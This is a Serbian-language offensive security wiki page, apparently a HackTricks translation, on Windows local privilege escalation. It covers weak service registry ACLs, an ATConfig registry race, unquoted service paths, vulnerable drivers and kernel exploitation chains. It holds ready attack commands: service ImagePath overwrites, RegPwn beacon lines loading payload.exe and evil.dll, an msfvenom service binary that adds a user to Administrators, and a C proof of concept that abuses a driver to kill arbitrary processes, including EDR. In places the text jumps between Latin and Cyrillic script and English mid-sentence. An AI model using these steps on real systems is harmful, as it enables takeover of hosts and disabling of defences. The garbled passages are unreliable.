Proverite da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole za upis u ključ registratora određenog servisa. Sam ACL unos ne dokazuje da je pristup efektivan: važni su unosi za odbijanje, trenutni token i nasleđene dozvole. Dozvole za ključ registratora razlikuju se od dozvola `SERVICE_CHANGE_CONFIG` i `SERVICE_START` za objekat servisa. Za eskalaciju su potrebni i upotrebljivo polje konfiguracije servisa, način da se servis pokrene i identitet servisa sa višim privilegijama. Pogledajte Microsoftove reference za [dozvole za ključeve registratora](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) i [dozvole za pristup servisima](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Da biste promenili Path do binarne datoteke koja se izvršava:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Trka sa simboličkom vezom u registru za proizvoljan upis vrednosti u HKLM (ATConfig)

Neke Windows funkcije pristupačnosti kreiraju **ATConfig** ključeve za svakog korisnika, koje proces **SYSTEM** kasnije kopira u ključ sesije u HKLM. Trka sa **simboličkom vezom** u registru može da preusmeri taj privilegovani upis na **bilo koju putanju u HKLM**, čime se dobija mogućnost **proizvoljnog upisa vrednosti** u HKLM.<sup>[[18]](#references)</sup>

Lokacije ključeva (primer: tastatura na ekranu `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` navodi instalirane funkcije pristupačnosti.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` čuva konfiguraciju koju kontroliše korisnik.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` kreira se tokom prijavljivanja/ prelazaka na bezbednu radnu površinu, a korisnik može da upisuje u njega.

Tok zloupotrebe (CVE-2026-24291 / ATConfig):

1. Popunite vrednost u **HKCU ATConfig** koju želite da SYSTEM upiše.
2. Pokrenite kopiranje na bezbednu radnu površinu (npr., **LockWorkstation**), čime se pokreće AT broker tok.
3. **Pobedite u trci** postavljanjem **oplock**-a na `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml`; kada se oplock aktivira, zamenite ključ **HKLM Session ATConfig** ključem **registry link** ka zaštićenom cilju u HKLM.
4. SYSTEM upisuje vrednost koju je izabrao napadač na preusmerenu putanju u HKLM.

Kada dobijete mogućnost proizvoljnog upisa vrednosti u HKLM, pređite na LPE tako što ćete prepisati vrednosti konfiguracije servisa:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komandna linija)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Izaberite servis koji običan korisnik može da pokrene (npr., **`msiserver`**) i pokrenite ga nakon upisa. **Napomena:** javna implementacija exploita **zaključava radnu stanicu** u sklopu trke.

Primer alata (RegPwn BOF / samostalna alatka):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Dozvole AppendData/AddSubdirectory u registru servisa

Ako imate ovu dozvolu nad registrom, to znači da **možete da kreirate podključeve u njemu**. U slučaju Windows servisa, ovo je **dovoljno za izvršavanje proizvoljnog koda:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Putanje servisa bez navodnika

Ako putanja do izvršne datoteke nije pod navodnicima, Windows će pokušati da izvrši svaku putanju koja se završava pre razmaka.

Na primer, za putanju _C:\Program Files\Some Folder\Service.exe_ Windows će pokušati da izvrši:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Izlistajte sve unquoted service paths, osim onih koji pripadaju ugrađenim Windows servisima:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Ovu ranjivost možete otkriti i iskoristiti** pomoću Metasploita: `exploit/windows/local/trusted\_service\_path` Servisni binary možete ručno napraviti pomoću Metasploita:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Radnje oporavka

Windows omogućava korisnicima da navedu radnje koje će se izvršiti ako usluga otkaže. Ova funkcija se može podesiti tako da upućuje na binarnu datoteku. Ako je moguće zameniti tu binarnu datoteku, eskalacija privilegija može biti moguća. Više detalja možete pronaći u [zvaničnoj dokumentaciji](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>).

## Ciljevi skripti planiranih zadataka

Za omogućen zadatak koji pokreće `cmd.exe /c` sa `.bat` ili `.cmd` datotekom, proverite skriptu navedenu u **argumentima radnje**, kao i `cmd.exe`. Isto važi za eksplicitni argument datoteke interpretera, kao što je PowerShell `-File`. Ako planirana batch datoteka sadrži doslovni poziv PowerShell `-File`, proverite i ACL te navedene skripte; promenljive, uslovi i ulančavanje komandi zahtevaju ručno praćenje. Skripta ili nadređeni direktorijum u koji pozivalac može da upisuje predstavljaju mogućnost za izvršavanje između naloga samo kada se principal podešen za zadatak razlikuje od pozivaoca i kada zadatak zaista dođe do te radnje. ACL koji dozvoljava samo dodavanje sadržaja može biti bitan za skripte, ali prethodni `exit` или другa kontrola toka mogu učiniti dodate linije nedostižnim. Pre nego što tvrdite da je eskalacija moguća, potvrdite efektivne ACL-ove, [kontekst izvršavanja zadatka](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), radni direktorijum, okidač i smernice za kontrolu aplikacija. Inventarisanje ne bi trebalo da menja skriptu niti da pokreće zadatak.

## Imenovani tokovi u dostupnim datotekama

Na NTFS-u, čitljiva datoteka može da sadrži imenovani `:$DATA` tok čiji sadržaj nije prikazan u običnom izlistavanju direktorijuma. Za mali, relevantan skup dostupnih rezervnih kopija ili konfiguracionih datoteka, pregledajte **nazive i veličine** tokova pre otvaranja njihovog sadržaja; Windows ih izlaže putem [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams), a PowerShell putem [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item). Naziv toka koji ukazuje na tajnu samo je naznaka. Proverite efektivna prava čitanja datoteke, podršku sistema datoteka za tokove, da li tok sadrži upotrebljive akreditive i na koji se nalog oni zaista autentifikuju. Izbegavajte rekurzivno skeniranje tokova i ispisivanje njihovog sadržaja tokom rutinskog popisivanja.

## Ulazi pomoćnog alata Windows Driver Kit koji se pokreće po rasporedu

Opcioni Windows Driver Kit uključuje `StandaloneRunner.exe`, koji može da koristi datoteke `command.txt`, `reboot.rsf` i projektni fajl `working\rsf.rsf` iz svog radnog direktorijuma. Planirani zadatak ili usluga koja pokreće ovaj pomoćni alat sa privilegovanim nalogom može da pretvori pristup za upis sa niskim privilegijama u te ulaze u izvršavanje komandi u kontekstu tog naloga, čak i kada je sama izvršna datoteka pomoćnog alata zaštićena. Potvrdite da privilegovani proces koristi ove datoteke i da je moguće kreirati ili izmeniti **obe** prateće datoteke; samo pronalaženje pomoćnog alata nije dovoljno.

Za planirani zadatak pregledajte [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) njegove radnje i ACL-ove dveju putanja do pratećih datoteka. Ako zadatak ne navodi radni direktorijum, direktorijum izvršne datoteke samo je naznaka koju treba proveriti, a ne dokaz lokacije sa koje zadatak čita ulazne datoteke. Takođe mora biti ispunjen preduslov za projektnu radnu datoteku. Proverite stvarni principal zadatka umesto da pretpostavite da se izvršava kao SYSTEM.

## Aplikacije

### Instalirane aplikacije

Proverite **dozvole nad binarnim datotekama** (možda možete da zamenite neku od njih i eskalirate privilegije) i nad **direktorijumima** ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Putanja za popravku Windows agenta Checkmk

[CVE-2024-0670](https://checkmk.com/werk/16361) utiče na starije Windows agente Checkmk koji su upisivali komandne datoteke u `C:\Windows\Temp`, a zatim izvršavali postojeću datoteku zaštićenu od upisivanja kada zamena ne bi uspela. Dobavljač je ispravio problem u verzijama 2.1.0p40, 2.2.0p23, 2.3.0b1 i 2.4.0b1. Proverite punu instaliranu verziju zakrpe i da li se pogođena operacija agenta može pokrenuti; oznaka koja navodi samo granu, poput `2.1`, ne može da utvrdi da li je sistem izložen. Enumeracija može da proveri verziju, stanje servisa i dozvole za Temp bez kreiranja datoteka ili pokretanja komandi agenta.

#### Provera SAML servisa ADSelfService Plus

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html) uticao je na ADSelfService Plus build 6210 i starije verzije; dobavljač ga je ispravio u buildu 6211. Relevantan je samo ako je SAML SSO **omogućen ili je ranije bio omogućen**. Unos instaliranog proizvoda ili putanja servisa zato predstavljaju trag, a ne potvrdu ranjivosti: proverite tačan build, istoriju SAML konfiguracije, dostupnost servisa preko mreže i nalog pod kojim se izvršava. Izvršavanje koda kroz servis nasleđuje privilegije tog naloga; izvršavanje kao SYSTEM zahteva instancu koja radi kao SYSTEM. Čitljiva datoteka `OfflineBackup_*.ezip` u direktorijumu Backup proizvoda predstavlja zaseban trag o šifrovanoj rezervnoj kopiji, a ne dokaz upotrebljive akreditive ili ove SAML ranjivosti. Tokom rutinske enumeracije zabeležite njenu putanju i prava pristupa, bez raspakivanja.

#### Granice između Jenkins kontrolera i domenskog naloga

Na Windows Jenkins kontroleru razlikujte dozvolu za kreiranje ili konfigurisanje posla od dozvole za njegovo pokretanje: [Jenkins ih dokumentuje kao zasebna prava `Job/Create`, `Job/Configure` i `Job/Build`](https://www.jenkins.io/doc/book/security/access-control/permissions/). Konfigurisani raspored ili udaljeni okidač može da pruži drugi način pokretanja builda, ali proverite da li je omogućen i da li se build zaista izvršava. Izvršavanje koristi identitet kontrolera ili izabranog agenta, a sačuvana akreditiva može da se koristi samo ako posao ima pristup njenom opsegu. Zasebno proverite pristup metapodacima u `JENKINS_HOME`: Jenkins čuva materijal akreditiva i ključeve za šifrovanje u `credentials.xml`, `secrets/hudson.util.Secret` i `secrets/master.key` ([Jenkins skladištenje tajni](https://www.jenkins.io/doc/developer/security/secrets/)). Njihovo prisustvo samo po sebi ne otkriva lozinku; proverite **pristup za čitanje potrebnim datotekama** i zaseban put za ponovnu upotrebu naloga, bez ispisivanja tajni u deljenom izlazu. Ako taj nalog ima pravo upisivanja u `scriptPath` AD korisničkog objekta, potvrdite da je putanja skripte upisiva i da postoji stvarna prijava ili zakazani proces koji je koristi i radi kao ciljni korisnik, pre nego što to smatrate izvršavanjem preko drugog korisnika. Dodatnu kontrolu nad grupom treba potvrditi zasebno, proverom efektivnih AD prava.

#### Identitet samostalno hostovanog agenta Azure Pipelines

Za Azure DevOps Server ili Azure Pipelines projekat razlikujte dozvolu za **kreiranje ili izmenu** pipeline-a od dozvole za njegovo **stavljanje u red** i korišćenje izabranog skupa agenata; [Microsoft odvojeno dokumentuje dozvole za pipeline](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) i [autorizaciju skupa agenata](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops). Ako nalog sa nižim privilegijama može da pošalje skriptni korak i pokrene taj pipeline na samostalno hostovanom Windows agentu, korak se izvršava kao [konfigurisani nalog operativnog sistema agenta](https://learn.microsoft.com/azure/devops/pipelines/agents/agents). Pre nego što tvrdite da postoji prelaz između korisnika ili na SYSTEM, proverite tačan pipeline, ograničenja grane/resursa, autorizovani skup agenata, izvršiv posao i identitet servisnog naloga agenta. Instalirani agent, uloga u projektu ili dozvola za upis u repozitorijum samo su tragovi; tokom pasivne enumeracije pregledajte dozvole i lokalne metapodatke servisa, ali ne pokrećite build.

#### Akreditivi Microsoft Entra Connect Sync

[Microsoft razlikuje](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) **servisni nalog ADSync**, koji pokreće servis za sinhronizaciju i pristupa njegovoj SQL bazi podataka, od **naloga konektora AD DS**, čije dozvole u direktorijumu zavise od konfigurisaniih funkcija sinhronizacije. Akreditivi konektora čuvaju se šifrovani u toj bazi podataka, dok je ključni materijal [zaštićen pomoću DPAPI-ja pod servisnim nalogom ADSync](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Instalirani servis za sinhronizaciju, grupa čiji naziv sugeriše lokalna administratorska prava ili sam pristup bazi podataka ne dokazuju da postoje akreditivi koji se mogu dešifrovati niti eskalacija u domenu. Zasebno proverite stvarna prava za čitanje baze podataka, pristup servisnog naloga/ključевима, raspored instalacije i SQL-а, konfigurisani идентитет конектора и ефективна AD права тог идентитета. Рутинска enumeracija треба да прикаже само метаподатке о сервису и приступу, а не да упитује или исписује сачуване тајне.

#### Дозволе за DLL-ове подршке драјвера штампача

Инсталирани драјвер штампача може да чува DLL-ове подршке у `C:\ProgramData` и да их учитава у привилегованији процес за штампање. Проверите ACL-ове тачног директоријума драјвера и DLL-ова, укључујући надређене директоријуме и reparse points, чак и ако је WMI enumeracija штампача онемогућена. За [проблем са драјвером штампача Ricoh CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1), наведена путања била је `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz`; [првобитно откриће](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) описује учитавање DLL-а од стране `PrintIsolationHost.exe`. ACL који дозвољава упис само је траг: проверите ефективни приступ упису након примењивања уноса за одбијање, да ли је релевантни драјвер инсталиран и учитава ли датотеку под привилегованим идентитетом, као и да ли је добављач ажурираним драјвером или безбедносним програмом исправио инсталацију. Не закључујте да постоји рањивост само на основу имена директоријума или верзије драјвера.

### Дозволе за упис

Проверите да ли можете да измените неку конфигурациону датотеку како бисте прочитали неку посебну датотеку или да ли можете да измените бинарну датотеку коју ће извршити налог Administrator (schedtasks).

Слабе дозволе над фасциклама/датотекама у систему можете да пронађете овако:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload persistence/execution

Notepad++ automatski učitava svaki plugin DLL koji se nalazi u njegovim podfolderima `plugins`. Ako postoji instalacija koja se može upisivati, bilo prenosiva ili kopirana, ubacivanje zlonamernog plugina omogućava automatsko izvršavanje koda unutar `notepad++.exe` pri svakom pokretanju (uključujući izvršavanje iz `DllMain` i povratnih poziva plugina).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Pokretanje pri startovanju

**Proverite da li možete da prepišete neki registry ili binarnu datoteku koju će izvršiti drugi korisnik.**\
**Pročitajte** **sledeću stranicu** da biste saznali više o zanimljivim **autoruns lokacijama za eskalaciju privilegija**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Draјveri

Potražite moguće **čudne/ranjive draјvere trećih strana**

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Ako driver izlaže proizvoljnu primitivu za čitanje/pisanje kernela (često kod loše dizajniranih IOCTL handlera), možete eskalirati privilegije direktnom krađom SYSTEM tokena iz memorije kernela.<sup>[[13]](#references)</sup> Detaljnu tehniku pogledajte ovde:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Povezani materijali o Windows kernel exploitation-u:

Za slučaj kernel-mode ring buffera sa registrima za čitanje/pisanje koje može da upisuje korisnički režim, pogledajte [USB MIDI looped-streaming varijantu](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming).

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Kod race-condition bugova u kojima ranjivi poziv otvara putanju Object Manager-a koju kontroliše napadač, namerno usporavanje pretrage (pomoću komponenti maksimalne dužine ili dubokih nizova direktorijuma) može da produži vremenski prozor sa mikrosekundi na desetine mikrosekundi:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### UAF-ovi u cancel-safe queue-ovima, odavanje podataka iz paged pool-a i I/O ring pivoti

Neki Windows kernel LPE lanci mogu se sastaviti od dve zasebno slabe greške: **race-a u životnom veku cancel-safe queue-a** koji oslobađa zahtev/CBD dok je zaključavanje queue-a i dalje aktivno, i odavanja podataka usled **oslobađanja zaključavanja pre kopiranja**, koje otkriva oslobođenu alokaciju iz paged pool-a tokom `RtlCopyToUser`.<sup>[[29]](#references)</sup>

Beleške za audit i exploitation:

- **Oslobađanje pod zaključavanjem + naknadni cancel**: tražite putanju uspešnog izvršavanja koja radi **Acquire -> CompleteRequest/free -> Release**, dok cancel putanja radi **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo**. Ako putanja uspešnog izvršavanja stigne do `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl` pre nego što oslobodi CBDQ/CSQ lock, nit blokirana u `NtCancelIoFileEx -> IopCsqCancelRoutine` može kasnije da nastavi i prosledi oslobođeni `PFLT_CALLBACK_DATA` callback-u za uklanjanje u driver-u.
- **Ponovo iskoristite oslobođeni queue objekat** pomoću alokacije iz paged pool-a iste veličine koju kontroliše napadač. `NPFS` Data Queue Entries su korisni jer se mogu kontrolisati sadržaj i veličina, a kasnije ih možete ispitati pipe read/peek operacijama. Ako oslobođeni objekat sadrži ugrađene list links, prepišite ih **cikličnom listom lažnih request node-ova u korisničkoj memoriji**, tako da driver više puta obrađuje strukture zahteva koje je definisao napadač umesto da završi na početnom list head-u.
- **Nadogradite predvidljiv upis**: ako lažni request preusmerava ugnježdeni context pointer koji se koristi za bookkeeping upise (timestamp-i / QPC / polja pored refcount-a), možete dobiti kernel upis čija je **adresa pod vašom kontrolom, ali ne i vrednost**. U tom slučaju ciljajte polje **length/size** objekta rasutog po pool-u umesto konačnog code/data pointer-a, a zatim prođite kroz spray dok oštećeni objekat ne omogući čitanje van granica iz paged pool-a.
- **Obrazac za odavanje podataka podložan race-u**: svaki syscall koji radi `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` dobar je kandidat. Pouzdanost se poboljšava kada napadač može da poveća kopirani buffer (na primer, dodavanjem mnogo list/resource stavki koje povećavaju konačnu veličinu alokacije serializer-a), jer duže kopiranje produžava prozor za zamenu, a da pritom ne mora nužno da sruši sistem.
- **Ciljevi za dopunu bogati pointer-ima**: Windows **I/O ring** registrovani nizovi buffer-a odlični su ciljevi za odavanje podataka jer je njihova veličina u paged pool-u pod kontrolom napadača (`8 * regBufferCnt`), a svaki element je kernel pointer ka `_IOP_MC_BUFFER_ENTRY`. Otkrijte jedan od ovih nizova, pronađite okolni `IORING_OBJECT`, a zatim oštetite **`RegBuffers`** i **`RegBuffersCount`**, tako da naredne I/O ring operacije koriste lažirane stavke koje je pripremio napadač i omoguće proizvoljno čitanje/pisanje kernela. Ako je jedini dostupan upis stabilan bajt (na primer, iz `KUSER_SHARED_DATA+0x14`), koristite **preklapajuće neporavnate upise** da biste sastavili ponavljajući korisnički pointer poput `0x0101010101010101`, mapirali ga pomoću `VirtualAlloc` i tamo postavili lažirani niz registrovanih buffer-a.<sup>[[30]](#references)</sup>

Korisni indikatori za debugging:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Once dobiješ proizvoljan pristup čitanju/pisanju kernela preko korumpiranog I/O ring-a, ukradi SYSTEM token standardnim post-primitive postupkom:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Primitivi za korupciju memorije Registry hive-a

Savremene ranjivosti hive-a omogućavaju pripremu determinističkih rasporeda, zloupotrebu upisivih potomaka HKLM/HKU i pretvaranje korupcije metapodataka u prekoračenja kernel paged-pool-a bez prilagođenog drajvera. Ceo lanac je opisan ovde:

{{#ref}}
windows-registry-hive-exploitation.md
{{#endref}}

#### `RtlQueryRegistryValues` zabuna tipova u direct-mode režimu zbog putanja pod kontrolom napadača

Neki drajveri prihvataju registry putanju iz userland-a, proveravaju samo da li je to ispravan UTF-16 string, a zatim pozivaju `RtlQueryRegistryValues(RTL_REGISTRY_ABSOLUTE, userPath, ...)` sa `RTL_QUERY_REGISTRY_DIRECT` i odredištem na steku, kao što je skalar `int readValue`. Ako nedostaje `RTL_QUERY_REGISTRY_TYPECHECK`, `EntryContext` se tumači prema **stvarnom** tipu registry vrednosti, a ne tipu koji je programer očekivao.

Ovo daje dva korisna primitiva:<sup>[[24]](#references)[[25]](#references)</sup>

- **Zloupotreba privilegovanog posrednika / oracle**: apsolutna putanja `\Registry\...` pod kontrolom korisnika omogućava drajveru da upituje ključeve koje je izabrao napadač, otkrije njihovo postojanje preko povratnih kodova/dnevnika i ponekad pročita vrednosti kojima pozivalac ne bi mogao direktno da pristupi.
- **Korupcija kernel memorije**: odredište za skalar, kao što je `&readValue`, može biti pogrešno protumačeno kao `REG_QWORD`, `UNICODE_STRING` ili bafer binarnih podataka određene veličine, u zavisnosti od tipa registry vrednosti.

Praktične napomene o eksploataciji:

- **Ublažavanje u Windows 8+**: ako upit pogodi **nepouzdani hive** sa `RTL_QUERY_REGISTRY_DIRECT`, ali bez `RTL_QUERY_REGISTRY_TYPECHECK`, pozivi iz kernela izazivaju pad sa `KERNEL_SECURITY_CHECK_FAILURE (0x139)`. Da bi ranjivost ostala iskoristiva, traži **ključeve na koje napadač može da upisuje, unutar pouzdanih sistemskih hive-ova**, umesto da pripremaš vrednosti pod `HKCU`.
- **Priprema u pouzdanom hive-u**: koristi NtObjectManager za pronalaženje potomaka `\Registry\Machine` na koje može da se upisuje, a zatim ponovi skeniranje sa dupliranim tokenom **low-integrity** da bi pronašao ključeve dostupne iz sandbox okruženja:<sup>[[26]](#references)</sup>

```powershell
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue
$token = Get-NtToken -Primary -Duplicate -IntegrityLevel Low
Get-AccessibleKey \Registry\Machine -Recurse -Access SetValue -Token $token
```

- **`REG_QWORD`**: direktan upis od 8 bajtova u `int` od 4 bajta oštećuje susedne podatke na steku i može delimično da prepiše obližnji pokazivač na callback/funkciju.
- **`REG_SZ` / `REG_EXPAND_SZ`**: direktni režim očekuje da `EntryContext` pokazuje na `UNICODE_STRING`. Ako kod prvo učita napadačev `REG_DWORD` na stek i zatim ponovo upotrebi isti bafer za čitanje stringa, napadač kontroliše `Length`/`MaximumLength` i delimično utiče na pokazivač `Buffer`, što omogućava delimično kontrolisan upis u kernel.
- **`REG_BINARY`**: za velike binarne podatke, direktni režim tretira prvi `LONG` na adresi `EntryContext` kao veličinu bafera sa predznakom. Ako prethodno čitanje `REG_DWORD` ostavi negativnu vrednost koju kontroliše napadač u ponovo upotrebljenoj skalarnoj promenljivoj, следећи упит `REG_BINARY` копира бајтове нападача директно преко суседних слотова стека, што је често најједноставнији пут до потпуног преписивања показивача на callback.

Snažan obrazac za traženje: **heterogena čitanja iz registra u istu promenljivu na steku bez njene ponovne inicijalizacije**. Pretražite `RTL_REGISTRY_ABSOLUTE`, `RTL_QUERY_REGISTRY_DIRECT`, ponovo upotrebljene pokazivače `EntryContext` i putanje koda u kojima prvo čitanje iz registra određuje da li će doći do drugog čitanja.

#### Zloupotreba nedostajućeg FILE_DEVICE_SECURE_OPEN na objektima uređaja (LPE + gašenje EDR-a)

Neki potpisani upravljački programi trećih strana kreiraju svoje objekte uređaja sa snažnim SDDL-om pomoću IoCreateDeviceSecure, ali zaboravljaju da podese FILE_DEVICE_SECURE_OPEN u DeviceCharacteristics. Bez ove zastavice, bezbedni DACL se ne sprovodi kada se uređaj otvara preko putanje koja sadrži dodatnu komponentu, pa svaki neprivilegovani korisnik može da dobije handle koristeći putanju prostora imena poput:<sup>[[14]](#references)</sup>

- \\ .\\DeviceName\\anything
- \\ .\\amsdk\\anyfile (iz stvarnog slučaja)

Kada korisnik može da otvori uređaj, privilegovani IOCTL-ovi koje izlaže upravljački program mogu se zloupotrebiti za LPE i neovlašćene izmene. Primeri mogućnosti zabeleženih u praksi:
- Vraćanje handle-ova sa punim pristupom proizvoljnim procesima (krađa tokena / SYSTEM shell preko DuplicateTokenEx/CreateProcessAsUser).
- Neograničeno čitanje/upisivanje sirovog diska (neovlašćene izmene van mreže, trikovi za perzistenciju pri pokretanju sistema).
- Prekidanje proizvoljnih procesa, uključujući Protected Process/Light (PP/PPL), što омогућава гашење AV/EDR-а из user mode-а преко kernela.

Minimalni obrazac PoC-a (user mode):
```c
// Example based on a vulnerable antimalware driver
#define IOCTL_REGISTER_PROCESS  0x80002010
#define IOCTL_TERMINATE_PROCESS 0x80002048

HANDLE h = CreateFileA("\\\\.\\amsdk\\anyfile", GENERIC_READ|GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
DWORD me = GetCurrentProcessId();
DWORD target = /* PID to kill or open */;
DeviceIoControl(h, IOCTL_REGISTER_PROCESS,  &me,     sizeof(me),     0, 0, 0, 0);
DeviceIoControl(h, IOCTL_TERMINATE_PROCESS, &target, sizeof(target), 0, 0, 0, 0);
```

Mere ublažavanja za programere
- Uvek postavite FILE_DEVICE_SECURE_OPEN prilikom kreiranja objekata uređaja koji treba da budu ograničeni pomoću DACL-a.
- Proveravajte kontekst pozivaoca za privilegovane operacije. Dodajte PP/PPL provere pre nego što dozvolite terminaciju procesa ili vraćanje handle-ova.
- Ograničite IOCTL-ove (maske pristupa, METHOD_*, validacija ulaza) i razmotrite posredničke modele umesto direktnih kernel privilegija.

Ideje za detekciju za odbranu
- Nadgledajte otvaranja sumnjivih naziva uređaja iz korisničkog režima (npr. \\ .\\amsdk*) i specifične sekvence IOCTL-ova koje ukazuju na zloupotrebu.
- Sprovodite Microsoft-ovu listu blokiranih ranjivih drajvera (HVCI/WDAC/Smart App Control) i održavajte sopstvene liste dozvoljenih/blokiranih stavki.


## PATH DLL Hijacking

Ako imate **dozvole za upis u fasciklu koja se nalazi na PATH-u**, možda ćete moći da otmete DLL koji učitava proces i **eskalirate privilegije**.<sup>[[2]](#references)</sup>

Proverite dozvole za sve fascikle unutar PATH-a:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

Za više informacija o tome kako da zloupotrebite ovu proveru:


{{#ref}}
dll-hijacking/writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

## Otimanje razrešavanja Node.js / Electron modula preko `C:\node_modules`

Ovo je varijanta **nekontrolisane putanje pretrage u Windowsu** koja utiče na aplikacije **Node.js** i **Electron** kada izvrše bare import, kao što je `require("foo")`, a očekivani modul **nedostaje**.<sup>[[20]](#references)</sup>

